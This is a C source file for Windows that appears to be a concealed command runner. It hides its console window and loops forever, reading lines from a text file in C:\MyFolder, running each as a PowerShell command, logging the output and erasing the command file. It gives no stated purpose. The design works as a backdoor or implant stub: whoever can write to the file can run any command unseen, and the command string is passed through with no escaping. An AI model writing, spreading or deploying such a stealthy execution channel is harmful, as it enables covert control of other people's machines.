#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


void createFilesIfNeeded(const char *inputFileName, const char *outputFileName)
{
    char folderPath[256];
    snprintf(folderPath, sizeof(folderPath), "C:\\MyFolder");
    CreateDirectory(folderPath, NULL); // Create the folder
    
    char fullPathInput[256];
    char fullPathOutput[256];
    snprintf(fullPathInput, sizeof(fullPathInput), "%s\\%s", folderPath, inputFileName);
    snprintf(fullPathOutput, sizeof(fullPathOutput), "%s\\%s", folderPath, outputFileName);
    
    FILE *inputFile = fopen(fullPathInput, "a");
    if (inputFile == NULL) {
        printf("Error creating/opening the input file.\n");
        exit(1);
    }
    fclose(inputFile);
    FILE *outputFile = fopen(fullPathOutput, "a");
    if (outputFile == NULL) {
        printf("Error creating/opening the output file.\n");
        exit(1);
    }
    fclose(outputFile);
}


void eraseCommands(const char *inputFileName)
{
    char folderPath[256];
    snprintf(folderPath, sizeof(folderPath), "C:\\MyFolder");
    
    char fullPathInput[256];
    snprintf(fullPathInput, sizeof(fullPathInput), "%s\\%s", folderPath, inputFileName);
    
    FILE *inputFile = fopen(fullPathInput, "w");
    if (inputFile == NULL) {
        printf("Error opening the input file for erasing.\n");
        exit(1);
    }
    fclose(inputFile);
}


int main()
{
    char inputFileName[] = "powershell_commands.txt";
    char outputFileName[] = "powershell_output.txt";
    createFilesIfNeeded(inputFileName, outputFileName);
    FreeConsole(); // Hides the console window
    while (1) {
        char folderPath[256];
        snprintf(folderPath, sizeof(folderPath), "C:\\MyFolder");
        
        char fullPathInput[256];
        char fullPathOutput[256];
        snprintf(fullPathInput, sizeof(fullPathInput), "%s\\%s", folderPath, inputFileName);
        snprintf(fullPathOutput, sizeof(fullPathOutput), "%s\\%s", folderPath, outputFileName);
        
        FILE *inputFile = fopen(fullPathInput, "r");
        if (inputFile == NULL)
        {
            printf("Error opening the input file.\n");
            return 1;
        }
        // Open the output file for writing
        FILE *outputFile = fopen(fullPathOutput, "a");
        if (outputFile == NULL)
        {
            printf("Error opening the output file.\n");
            fclose(inputFile);
            return 1;
        }
        char command[256];
        if (fgets(command, sizeof(command), inputFile) != NULL)
        {
            // Remove newline character from the command
            size_t len = strlen(command);
            if (len > 0 && command[len - 1] == '\n')
            {
                command[len - 1] = '\0';
            }
            // Prepare the PowerShell command
            char powershellCommand[512];
            snprintf(powershellCommand, sizeof(powershellCommand), "powershell.exe -Command \"%s\"", command);
            // Execute the PowerShell command and capture the output using pipes
            FILE *powershellProcess = _popen(powershellCommand, "r");
            if (powershellProcess != NULL)
            {
                // Read the output from the PowerShell process
                char buffer[1024];
                while (fgets(buffer, sizeof(buffer), powershellProcess) != NULL)
                {
                    fprintf(outputFile, "%s", buffer);
                }
                _pclose(powershellProcess);
                eraseCommands(inputFileName);
                printf("Command executed successfully!\n");
            }
            else
            {
                fprintf(outputFile, "Error executing PowerShell command: %s\n", command);
            }
        }
        fclose(inputFile);
        fclose(outputFile);
        Sleep(1000);
    }
    return 0;
}
